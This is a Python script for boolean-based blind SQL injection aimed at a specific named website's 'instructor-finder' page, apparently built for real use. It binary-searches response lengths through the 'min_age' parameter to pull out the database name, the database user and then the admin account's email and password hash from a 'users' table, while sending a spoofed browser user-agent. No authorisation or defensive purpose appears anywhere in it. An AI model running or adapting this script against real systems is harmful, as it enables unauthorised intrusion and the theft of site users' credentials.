import requests
import time
import sys

TARGET = "https://web.kelasdata.co.id/instructor-finder"
HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Accept-Encoding': 'gzip, deflate, br',
    'Accept-Language': 'en-US,en;q=0.9',
    'Upgrade-Insecure-Requests': '1'
}

# Threshold determined from previous tests (True ~124k, False ~66k)
THRESHOLD = 90000 

def make_request(payload):
    try:
        # Retry mechanism
        for _ in range(3):
            try:
                r = requests.get(TARGET, params={"min_age": payload}, headers=HEADERS, timeout=20)
                if r.status_code == 200:
                    return len(r.text)
            except requests.exceptions.RequestException:
                time.sleep(1)
                continue
        return 0
    except:
        return 0

def get_length(target_str_sql):
    print(f"[*] Measuring length of: {target_str_sql}")
    low = 1
    high = 64
    while low <= high:
        mid = (low + high) // 2
        payload = f"1 AND (length({target_str_sql}) > {mid})"
        resp_len = make_request(payload)
        
        # print(f"    Debug: > {mid} => len {resp_len}", end="\r")
        
        if resp_len > THRESHOLD:
            low = mid + 1
        else:
            high = mid - 1
            
    # low is now length + 1
    length = low
    # Verify exact match
    payload_exact = f"1 AND (length({target_str_sql}) = {length})"
    if make_request(payload_exact) > THRESHOLD:
        print(f"    [+] Length confirmed: {length}")
        return length
    
    # Check neighbors if exact match failed (off-by-one fix)
    payload_lower = f"1 AND (length({target_str_sql}) = {length-1})"
    if make_request(payload_lower) > THRESHOLD:
        print(f"    [+] Length confirmed: {length-1}")
        return length-1
        
    print(f"    [!] Could not confirm exact length for {length} or {length-1}")
    return length

def extract_string(target_str_sql, length):
    print(f"[*] Extracting: {target_str_sql}")
    extracted = ""
    for i in range(1, length + 1):
        low = 32
        high = 126
        while low <= high:
            mid = (low + high) // 2
            payload = f"1 AND (ascii(substr({target_str_sql},{i},1)) > {mid})"
            resp_len = make_request(payload)
            
            if resp_len > THRESHOLD:
                low = mid + 1
            else:
                high = mid - 1
        
        if low > 126 or low < 32:
            extracted += "?"
        else:
            extracted += chr(low)
        print(f"    {extracted}", end="\r")
        sys.stdout.flush()
        
    print(f"\n    [+] Result: {extracted}")
    return extracted

def main():
    print("=== Advanced SQLi Dump for web.kelasdata.co.id ===")
    
    # 1. Get DB Name Length
    db_len = get_length("database()")
    if db_len > 0:
        extract_string("database()", db_len)
    
    # 2. Get User Length
    user_len = get_length("user()")
    if user_len > 0:
        extract_string("user()", user_len)
        
    # 3. Get Version (Optional, usually long)
    # ver_len = get_length("version()")
    
    # 4. Try to fetch admin hash if we assume 'users' table exists 
    # Check if 'users' table exists count
    print("[*] Checking 'users' table existence...")
    payload_check = "1 AND (SELECT count(*) FROM users) > 0"
    if make_request(payload_check) > THRESHOLD:
        print("    [+] Table 'users' FOUND.")
        
        # Get admin credentials (id=1)
        # Email
        email_len = get_length("(SELECT email FROM users WHERE id=1)")
        if email_len > 0:
            extract_string("(SELECT email FROM users WHERE id=1)", email_len)
            
        # Password
        pass_len = get_length("(SELECT password FROM users WHERE id=1)")
        if pass_len > 0:
            extract_string("(SELECT password FROM users WHERE id=1)", pass_len)
    else:
        print("    [-] Table 'users' NOT FOUND or inaccessible directly.")

if __name__ == "__main__":
    main()
